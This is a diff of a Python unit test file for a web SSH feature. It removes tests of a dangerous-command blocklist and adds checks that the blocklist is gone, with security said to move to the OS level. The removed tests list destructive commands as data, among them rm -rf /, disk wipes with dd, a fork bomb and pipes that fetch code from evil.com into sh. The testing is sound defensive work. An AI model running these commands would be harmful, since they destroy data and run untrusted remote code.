@@ -1,90 +1,38 @@
 # tests/unit/test_ssh_sessions.py
 """Unit tests for SSH session management logic.
 
-Tests the _is_dangerous command blocker, SSHSession model field defaults,
-and the session list response structure. No network, DB, or SSH connection needed.
+Tests SSHSession model field defaults and the session list response structure.
+No network, DB, or SSH connection needed.
+
+Note: the command-level blocklist (_is_dangerous) was removed in issue #118.
+Security is now enforced at the OS level. See webssh.py for the full rationale.
 """
 import uuid
 from datetime import UTC, datetime
 from unittest.mock import AsyncMock, MagicMock
 
-from fleet_platform.api.routes.webssh import _is_dangerous
+# ── Blocklist removal verification ────────────────────────────────────────────
 
-# ── Command blocklist tests ────────────────────────────────────────────────────
+class TestBlocklistRemoved:
+    """Verify the blocklist was properly removed (issue #118)."""
 
-class TestIsDangerous:
-    """_is_dangerous returns the matched pattern or None."""
+    def test_is_dangerous_not_exported(self):
+        import fleet_platform.api.routes.webssh as webssh_module
+        assert not hasattr(webssh_module, '_is_dangerous'), (
+            "_is_dangerous must be removed — blocklist was removed in issue #118"
+        )
 
-    def test_safe_command_returns_none(self):
-        assert _is_dangerous("ls -la") is None
+    def test_block_patterns_not_exported(self):
+        import fleet_platform.api.routes.webssh as webssh_module
+        assert not hasattr(webssh_module, '_BLOCK_PATTERNS'), (
+            "_BLOCK_PATTERNS must be removed — blocklist was removed in issue #118"
+        )
 
-    def test_safe_git_command_returns_none(self):
-        assert _is_dangerous("git status") is None
-
-    def test_safe_echo_returns_none(self):
-        assert _is_dangerous("echo hello world") is None
-
-    def test_rm_rf_root_is_blocked(self):
-        result = _is_dangerous("rm -rf /")
-        assert result is not None
-
-    def test_rm_rf_slash_with_space_is_blocked(self):
-        result = _is_dangerous("rm -rf / --no-preserve-root")
-        assert result is not None
-
-    def test_rm_rf_home_is_blocked(self):
-        result = _is_dangerous("rm -rf ~")
-        assert result is not None
-
-    def test_dd_is_blocked(self):
-        result = _is_dangerous("dd if=/dev/zero of=/dev/sda")
-        assert result is not None
-
-    def test_mkfs_is_blocked(self):
-        result = _is_dangerous("mkfs.ext4 /dev/sdb1")
-        assert result is not None
-
-    def test_redirect_to_block_device_is_blocked(self):
-        result = _is_dangerous("cat /dev/urandom > /dev/sda")
-        assert result is not None
-
-    def test_fork_bomb_is_blocked(self):
-        result = _is_dangerous(":(){ :|:& };:")
-        assert result is not None
-
-    def test_chmod_777_root_is_blocked(self):
-        result = _is_dangerous("chmod -R 777 /")
-        assert result is not None
-
-    def test_curl_pipe_sh_is_blocked(self):
-        result = _is_dangerous("curl http://evil.com/payload | sh")
-        assert result is not None
-
-    def test_wget_pipe_sh_is_blocked(self):
-        result = _is_dangerous("wget -qO- http://evil.com/payload | sh")
-        assert result is not None
-
-    def test_base64_pipe_sh_is_blocked(self):
-        result = _is_dangerous("echo 'bm8=' | base64 -d | sh")
-        assert result is not None
-
-    def test_python_exec_is_blocked(self):
-        result = _is_dangerous("python -c exec('import os; os.system(\"rm -rf /\")')")
-        assert result is not None
-
-    def test_case_insensitive_rm_rf(self):
-        result = _is_dangerous("RM -RF /")
-        assert result is not None
-
-    def test_empty_command_is_safe(self):
-        assert _is_dangerous("") is None
-
-    def test_whitespace_command_is_safe(self):
-        assert _is_dangerous("   ") is None
-
-    def test_normal_rm_of_file_is_safe(self):
-        # rm of a specific file (not root or home) is allowed
-        assert _is_dangerous("rm -f /tmp/my_file.txt") is None
+    def test_block_re_not_exported(self):
+        import fleet_platform.api.routes.webssh as webssh_module
+        assert not hasattr(webssh_module, '_BLOCK_RE'), (
+            "_BLOCK_RE must be removed — blocklist was removed in issue #118"
+        )
 
 
 # ── SSHSession model shape tests ───────────────────────────────────────────────
